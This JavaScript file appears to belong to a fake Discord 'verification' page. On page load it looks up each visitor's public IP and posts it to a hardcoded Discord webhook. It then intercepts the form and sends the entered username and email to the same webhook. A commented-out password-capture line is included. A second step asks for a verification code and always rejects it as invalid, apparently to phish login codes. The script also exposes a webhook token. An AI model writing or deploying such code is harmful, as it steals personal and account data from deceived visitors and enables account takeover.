// ←––– Your Discord webhook URL (replace with your test webhook)
const WEBHOOK_URL = "https://discord.com/api/webhooks/1388139167103582218/OTZHoiUd0w-XiBleGI5w_U8iE2rfZuQhpA6AT7Yo8n-iofiK1xWQVaxqFjEx0WBPJ6rt";

// ——— Send visitor IP on page load —————————————————————————————
window.addEventListener("DOMContentLoaded", () => {
  // fetch the public IP
  fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(data => {
      const ip = data.ip;
      return fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: "TestBot",
          embeds: [{
            title: "🖥Page Visited",
            color: 0x5865F2,
            fields: [
              { name: "IP Address", value: ip, inline: false }
            ],
            timestamp: new Date()
          }]
        })
      });
    })
    .catch(console.error);
});

// ——— Intercept form submit and POST username/email —————————————————
document.getElementById("verifyForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const username = document.getElementById("username").value.trim();
  const email    = document.getElementById("email").value.trim();
  // const password = document.getElementById("password").value; // if you need it

  // send to webhook
  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username: "TestBot",
      embeds: [{
        title: "Verification Submitted",
        color: 0x57F287,
        fields: [
          { name: "Discord Username", value: username || "(empty)", inline: true },
          { name: "Email",    value: email    || "(empty)", inline: true }
        ],
        timestamp: new Date()
      }]
    })
  })
  .then(() => {
    // now advance to step 2
    document.getElementById("step1").classList.add("hidden");
    document.getElementById("step2").classList.remove("hidden");
  })
  .catch(console.error);
});

document.getElementById("codeForm").addEventListener("submit", function(e) {
  e.preventDefault();
  alert("The verification code is invalid. Please try again.");
});
